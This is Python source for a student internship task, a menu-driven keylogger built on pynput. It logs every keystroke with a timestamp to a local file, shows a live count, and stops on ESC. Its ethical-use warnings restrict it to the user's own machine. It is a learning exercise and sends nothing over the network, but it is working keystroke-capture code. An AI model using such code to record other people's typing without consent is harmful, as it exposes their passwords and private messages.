"""
Task-04: Simple Keylogger
Prodigy Infotech Internship

⚠️  ETHICAL USE ONLY:
    - Run ONLY on your OWN computer
    - ONLY for learning/testing purposes
    - NEVER use on someone else's system without consent
    - Unauthorized keylogging is ILLEGAL

Features:
  - Logs all keystrokes with timestamps
  - Saves to a log file
  - Start / Stop with keyboard shortcut (ESC key)
  - Displays live key count
"""

from pynput import keyboard
from datetime import datetime
import os


# ──────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────

LOG_FILE = "keylog.txt"
STOP_KEY = keyboard.Key.esc   # Press ESC to stop logging


# ──────────────────────────────────────────────
# Keylogger class
# ──────────────────────────────────────────────

class SimpleKeylogger:
    def __init__(self, log_file: str):
        self.log_file = log_file
        self.key_count = 0
        self.session_start = datetime.now()
        self._write_header()

    def _write_header(self):
        """Write session header to log file."""
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write("\n" + "=" * 50 + "\n")
            f.write(f"  Keylogger Session Started\n")
            f.write(f"  Date/Time : {self.session_start.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 50 + "\n\n")

    def _write_footer(self):
        """Write session summary to log file."""
        duration = datetime.now() - self.session_start
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write("\n\n" + "=" * 50 + "\n")
            f.write(f"  Session Ended\n")
            f.write(f"  Total Keys Pressed : {self.key_count}\n")
            f.write(f"  Duration           : {str(duration).split('.')[0]}\n")
            f.write("=" * 50 + "\n")

    def _log(self, text: str):
        """Append text to log file."""
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(text)

    def on_press(self, key):
        """Called every time a key is pressed."""
        self.key_count += 1
        timestamp = datetime.now().strftime('%H:%M:%S')

        try:
            # Regular character key
            char = key.char
            log_entry = char if char else ''
        except AttributeError:
            # Special key (Enter, Space, Backspace, etc.)
            if key == keyboard.Key.space:
                log_entry = ' '
            elif key == keyboard.Key.enter:
                log_entry = '\n'
            elif key == keyboard.Key.backspace:
                log_entry = '[BACKSPACE]'
            elif key == keyboard.Key.tab:
                log_entry = '[TAB]'
            elif key == keyboard.Key.caps_lock:
                log_entry = '[CAPS_LOCK]'
            elif key == keyboard.Key.delete:
                log_entry = '[DELETE]'
            else:
                log_entry = f'[{key.name.upper()}]'

        self._log(log_entry)
        print(f"  Key #{self.key_count:04d} [{timestamp}] → {repr(log_entry)}")

        # Stop on ESC key
        if key == STOP_KEY:
            return False

    def on_release(self, key):
        """Called every time a key is released."""
        pass  # Not used, but required by pynput

    def start(self):
        """Start listening for keystrokes."""
        print(f"\n  🟢 Keylogger started! Press ESC to stop.")
        print(f"  📄 Logging to: {os.path.abspath(self.log_file)}\n")
        print("  " + "─" * 40)

        try:
            with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            ) as listener:
                listener.join()
        except KeyboardInterrupt:
            pass  # Ctrl+C pressed — stop gracefully

        self._write_footer()
        print("\n  " + "─" * 40)
        print(f"  🔴 Keylogger stopped.")
        print(f"  📊 Total keys logged : {self.key_count}")
        print(f"  📄 Log saved to      : {os.path.abspath(self.log_file)}")


# ──────────────────────────────────────────────
# Main
# ──────────────────────────────────────────────

def print_banner():
    print("=" * 50)
    print("   ⌨️  Simple Keylogger — Task 04")
    print("   Prodigy Infotech Internship")
    print("=" * 50)
    print("""
  ⚠️  ETHICAL NOTICE:
  This tool is for EDUCATIONAL purposes only.
  Use it ONLY on your OWN system.
  Unauthorized keylogging is ILLEGAL.
""")


def main():
    print_banner()

    print("  Options:")
    print("  1. Start Keylogger")
    print("  2. View Log File")
    print("  3. Clear Log File")
    print("  4. Exit")

    while True:
        choice = input("\n  Enter choice (1/2/3/4): ").strip()

        if choice == '1':
            logger = SimpleKeylogger(LOG_FILE)
            logger.start()

        elif choice == '2':
            if os.path.exists(LOG_FILE):
                print(f"\n  📄 Contents of {LOG_FILE}:\n")
                print("  " + "─" * 40)
                with open(LOG_FILE, 'r', encoding='utf-8') as f:
                    print(f.read())
                print("  " + "─" * 40)
            else:
                print("  ⚠  No log file found. Start the keylogger first.")

        elif choice == '3':
            if os.path.exists(LOG_FILE):
                os.remove(LOG_FILE)
                print(f"  ✅ Log file cleared.")
            else:
                print("  ⚠  No log file to clear.")

        elif choice == '4':
            print("\n  Goodbye! 👋")
            break

        else:
            print("  ⚠  Invalid choice. Enter 1, 2, 3, or 4.")


if __name__ == "__main__":
    main()
